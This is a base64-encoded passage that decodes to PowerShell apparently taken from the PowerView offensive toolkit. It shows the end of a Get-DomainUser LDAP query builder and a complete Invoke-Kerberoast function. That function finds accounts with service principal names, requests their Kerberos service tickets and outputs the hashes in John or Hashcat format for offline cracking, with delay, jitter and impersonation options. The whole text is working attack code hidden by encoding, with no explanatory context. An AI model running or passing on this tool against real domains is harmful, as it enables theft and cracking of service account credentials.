ZdezR9LSl7M31bMC05QS1GXXsxMn0kJykgewogICAgICAgICAgICAgICAgICAgICRHdWlkQnl0ZVN0cmluZyA9ICgoW0d1aWRdJElkZW50aXR5SW5zdGFuY2UpLlRvQnl0ZUFycmF5KCkgfCBGb3JFYWNoLU9iamVjdCB7ICdcJyArICRfLlRvU3RyaW5nKCdYMicpIH0pIC1qb2luICcnCiAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIob2JqZWN0Z3VpZD0kR3VpZEJ5dGVTdHJpbmcpIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmICgkSWRlbnRpdHlJbnN0YW5jZS5Db250YWlucygnXCcpKSB7CiAgICAgICAgICAgICAgICAgICAgJENvbnZlcnRlZElkZW50aXR5SW5zdGFuY2UgPSAkSWRlbnRpdHlJbnN0YW5jZS5SZXBsYWNlKCdcMjgnLCAnKCcpLlJlcGxhY2UoJ1wyOScsICcpJykgfCBDb252ZXJ0LUFETmFtZSAtT3V0cHV0VHlwZSBDYW5vbmljYWwKICAgICAgICAgICAgICAgICAgICBpZiAoJENvbnZlcnRlZElkZW50aXR5SW5zdGFuY2UpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJEb21haW4gPSAkQ29udmVydGVkSWRlbnRpdHlJbnN0YW5jZS5TdWJTdHJpbmcoMCwgJENvbnZlcnRlZElkZW50aXR5SW5zdGFuY2UuSW5kZXhPZignLycpKQogICAgICAgICAgICAgICAgICAgICAgICAkVXNlck5hbWUgPSAkSWRlbnRpdHlJbnN0YW5jZS5TcGxpdCgnXCcpWzFdCiAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKHNhbUFjY291bnROYW1lPSRVc2VyTmFtZSkiCiAgICAgICAgICAgICAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkVXNlckRvbWFpbgogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpblVzZXJdIEV4dHJhY3RlZCBkb21haW4gJyRVc2VyRG9tYWluJyBmcm9tICckSWRlbnRpdHlJbnN0YW5jZSciCiAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyU2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgQFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIoc2FtQWNjb3VudE5hbWU9JElkZW50aXR5SW5zdGFuY2UpIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICBpZiAoJElkZW50aXR5RmlsdGVyIC1hbmQgKCRJZGVudGl0eUZpbHRlci5UcmltKCkgLW5lICcnKSApIHsKICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gIih8JElkZW50aXR5RmlsdGVyKSIKICAgICAgICAgICAgfQoKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU1BOJ10pIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1tHZXQtRG9tYWluVXNlcl0gU2VhcmNoaW5nIGZvciBub24tbnVsbCBzZXJ2aWNlIHByaW5jaXBhbCBuYW1lcycKICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gJyhzZXJ2aWNlUHJpbmNpcGFsTmFtZT0qKScKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydBbGxvd0RlbGVnYXRpb24nXSkgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnW0dldC1Eb21haW5Vc2VyXSBTZWFyY2hpbmcgZm9yIHVzZXJzIHdobyBjYW4gYmUgZGVsZWdhdGVkJwogICAgICAgICAgICAgICAgIyBuZWdhdGlvbiBvZiAiQWNjb3VudHMgdGhhdCBhcmUgc2Vuc2l0aXZlIGFuZCBub3QgdHJ1c3RlZCBmb3IgZGVsZWdhdGlvbiIKICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gJyghKHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0xMDQ4NTc0KSknCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRGlzYWxsb3dEZWxlZ2F0aW9uJ10pIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1tHZXQtRG9tYWluVXNlcl0gU2VhcmNoaW5nIGZvciB1c2VycyB3aG8gYXJlIHNlbnNpdGl2ZSBhbmQgbm90IHRydXN0ZWQgZm9yIGRlbGVnYXRpb24nCiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICcodXNlckFjY291bnRDb250cm9sOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTEwNDg1NzQpJwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0FkbWluQ291bnQnXSkgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnW0dldC1Eb21haW5Vc2VyXSBTZWFyY2hpbmcgZm9yIGFkbWluQ291bnQ9MScKICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gJyhhZG1pbmNvdW50PTEpJwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RydXN0ZWRUb0F1dGgnXSkgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnW0dldC1Eb21haW5Vc2VyXSBTZWFyY2hpbmcgZm9yIHVzZXJzIHRoYXQgYXJlIHRydXN0ZWQgdG8gYXV0aGVudGljYXRlIGZvciBvdGhlciBwcmluY2lwYWxzJwogICAgICAgICAgICAgICAgJEZpbHRlciArPSAnKG1zZHMtYWxsb3dlZHRvZGVsZWdhdGV0bz0qKScKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydQcmVhdXRoTm90UmVxdWlyZWQnXSkgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnW0dldC1Eb21haW5Vc2VyXSBTZWFyY2hpbmcgZm9yIHVzZXIgYWNjb3VudHMgdGhhdCBkbyBub3QgcmVxdWlyZSBrZXJiZXJvcyBwcmVhdXRoZW50aWNhdGUnCiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICcodXNlckFjY291bnRDb250cm9sOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTQxOTQzMDQpJwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0xEQVBGaWx0ZXInXSkgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5Vc2VyXSBVc2luZyBhZGRpdGlvbmFsIExEQVAgZmlsdGVyOiAkTERBUEZpbHRlciIKICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gIiRMREFQRmlsdGVyIgogICAgICAgICAgICB9CgogICAgICAgICAgICAjIGJ1aWxkIHRoZSBMREFQIGZpbHRlciBmb3IgdGhlIGR5bmFtaWMgVUFDIGZpbHRlciB2YWx1ZQogICAgICAgICAgICAkVUFDRmlsdGVyIHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICBpZiAoJF8gLW1hdGNoICdOT1RfLionKSB7CiAgICAgICAgICAgICAgICAgICAgJFVBQ0ZpZWxkID0gJF8uU3Vic3RyaW5nKDQpCiAgICAgICAgICAgICAgICAgICAgJFVBQ1ZhbHVlID0gW0ludF0oJFVBQ0VudW06OiRVQUNGaWVsZCkKICAgICAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIoISh1c2VyQWNjb3VudENvbnRyb2w6MS4yLjg0MC4xMTM1NTYuMS40LjgwMzo9JFVBQ1ZhbHVlKSkiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkVUFDVmFsdWUgPSBbSW50XSgkVUFDRW51bTo6JF8pCiAgICAgICAgICAgICAgICAgICAgJEZpbHRlciArPSAiKHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0kVUFDVmFsdWUpIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICAkVXNlclNlYXJjaGVyLmZpbHRlciA9ICIoJihzYW1BY2NvdW50VHlwZT04MDUzMDYzNjgpJEZpbHRlcikiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluVXNlcl0gZmlsdGVyIHN0cmluZzogJCgkVXNlclNlYXJjaGVyLmZpbHRlcikiCgogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydGaW5kT25lJ10pIHsgJFJlc3VsdHMgPSAkVXNlclNlYXJjaGVyLkZpbmRPbmUoKSB9CiAgICAgICAgICAgIGVsc2UgeyAkUmVzdWx0cyA9ICRVc2VyU2VhcmNoZXIuRmluZEFsbCgpIH0KICAgICAgICAgICAgJFJlc3VsdHMgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1JhdyddKSB7CiAgICAgICAgICAgICAgICAgICAgIyByZXR1cm4gcmF3IHJlc3VsdCBvYmplY3RzCiAgICAgICAgICAgICAgICAgICAgJFVzZXIgPSAkXwogICAgICAgICAgICAgICAgICAgICRVc2VyLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5Vc2VyLlJhdycpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkVXNlciA9IENvbnZlcnQtTERBUFByb3BlcnR5IC1Qcm9wZXJ0aWVzICRfLlByb3BlcnRpZXMKICAgICAgICAgICAgICAgICAgICAkVXNlci5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuVXNlcicpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkVXNlcgogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkUmVzdWx0cykgewogICAgICAgICAgICAgICAgdHJ5IHsgJFJlc3VsdHMuZGlzcG9zZSgpIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpblVzZXJdIEVycm9yIGRpc3Bvc2luZyBvZiB0aGUgUmVzdWx0cyBvYmplY3Q6ICRfIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgICRVc2VyU2VhcmNoZXIuZGlzcG9zZSgpCiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gSW52b2tlLUtlcmJlcm9hc3QgewoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LlNQTlRpY2tldCcpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnRGlzdGluZ3Vpc2hlZE5hbWUnLCAnU2FtQWNjb3VudE5hbWUnLCAnTmFtZScsICdNZW1iZXJEaXN0aW5ndWlzaGVkTmFtZScsICdNZW1iZXJOYW1lJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRJZGVudGl0eSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRMREFQRmlsdGVyLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnQURTUGF0aCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaEJhc2UsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMCwxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkRGVsYXkgPSAwLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgwLjAsIDEuMCldCiAgICAgICAgW0RvdWJsZV0KICAgICAgICAkSml0dGVyID0gLjMsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnSm9obicsICdIYXNoY2F0JyldCiAgICAgICAgW0FsaWFzKCdGb3JtYXQnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRPdXRwdXRGb3JtYXQgPSAnSm9obicsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICAkVXNlclNlYXJjaGVyQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgJ1NQTicgPSAkVHJ1ZQogICAgICAgICAgICAnUHJvcGVydGllcycgPSAnc2FtYWNjb3VudG5hbWUsZGlzdGluZ3Vpc2hlZG5hbWUsc2VydmljZXByaW5jaXBhbG5hbWUnCiAgICAgICAgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snTERBUEZpbHRlciddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ0xEQVBGaWx0ZXInXSA9ICRMREFQRmlsdGVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJFNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQoKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgJExvZ29uVG9rZW4gPSBJbnZva2UtVXNlckltcGVyc29uYXRpb24gLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwKICAgICAgICB9CiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snSWRlbnRpdHknXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydJZGVudGl0eSddID0gJElkZW50aXR5IH0KICAgICAgICBHZXQtRG9tYWluVXNlciBAVXNlclNlYXJjaGVyQXJndW1lbnRzIHwgV2hlcmUtT2JqZWN0IHskXy5zYW1hY2NvdW50bmFtZSAtbmUgJ2tyYnRndCd9IHwgR2V0LURvbWFpblNQTlRpY2tldCAtRGVsYXkgJERlbGF5IC1PdXRwdXRGb3JtYXQgJE91dHB1dEZvcm1hdCAtSml0dGVyICRKaXR0ZXIKICAgIH0KCiAgICBFTkQgewogICAgICAgIGlmICgkTG9nb25Ub2tlbikgewogICAgICAgICAgICBJbnZva2UtUmV2ZXJ0VG9TZWxmIC1Ub2tlbkhhbmRsZSAkTG9nb25Ub2tlbgogICAgICAgIH0KICAgIH0KfQ=="
